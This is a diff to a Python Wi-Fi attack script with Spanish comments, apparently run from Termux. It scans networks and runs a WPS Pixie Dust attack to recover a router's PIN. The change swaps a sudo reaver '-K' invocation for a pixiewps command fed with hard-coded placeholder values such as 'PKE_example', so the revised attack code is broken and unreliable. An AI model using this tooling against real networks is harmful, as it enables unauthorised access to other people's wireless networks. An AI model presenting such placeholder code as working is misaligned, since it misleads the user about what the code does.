@@ -53,29 +53,37 @@ def scan_wifi(interface):
     return redes, bssids, canales
 
 def perform_pixie_dust_attack(interface, bssid):
-    """Realiza el ataque Pixie Dust usando reaver con la opción -K."""
+    """Realiza el ataque Pixie Dust usando pixiewps."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
-    reaver_path = "/data/data/com.termux/files/home/reaver-wps-fork-t6x/src/reaver"
-    command = f"{reaver_path} -i {interface} -b {bssid} -K"
-    print(f"Ejecutando reaver: {command}")
-    stdout, stderr = run_command(command, use_sudo=True)
+    # Aquí deberías capturar los datos necesarios para pixiewps usando wpa_supplicant
+    # Este es un ejemplo simplificado, asegúrate de capturar los datos necesarios correctamente
+    pke = "PKE_example"
+    pkr = "PKR_example"
+    ehash1 = "E-Hash1_example"
+    ehash2 = "E-Hash2_example"
+    authkey = "AuthKey_example"
 
-    print("Salida de reaver:")
-    print(stdout)
-    print(stderr)
+    # Ejecutar pixiewps con los valores capturados
+    pixiewps_command = f"pixiewps -e {ehash1} -r {ehash2} -s {pke} -z {pkr} -a {authkey} -vv"
+    print(f"Ejecutando pixiewps: {pixiewps_command}")
+    pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=False)
 
-    if "WPS pin:" in stdout:
-        pin = extract_value(stdout, "WPS pin:")
+    print("Salida de pixiewps:")
+    print(pixie_stdout)
+    print(pixie_stderr)
+
+    if "WPS pin:" in pixie_stdout:
+        pin = extract_value(pixie_stdout, "WPS pin:")
         print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
         return pin
     else:
         print("\nPixie Dust no pudo encontrar el PIN.")
-        print(stdout)
+        print(pixie_stdout)
         return None
 
 def main():
     # Verificar la disponibilidad de las herramientas necesarias
-    tools = ["iw", "pixiewps"]
+    tools = ["iw", "pixiewps", "wpa_supplicant"]
     for tool in tools:
         if not check_tool_availability(tool):
             return
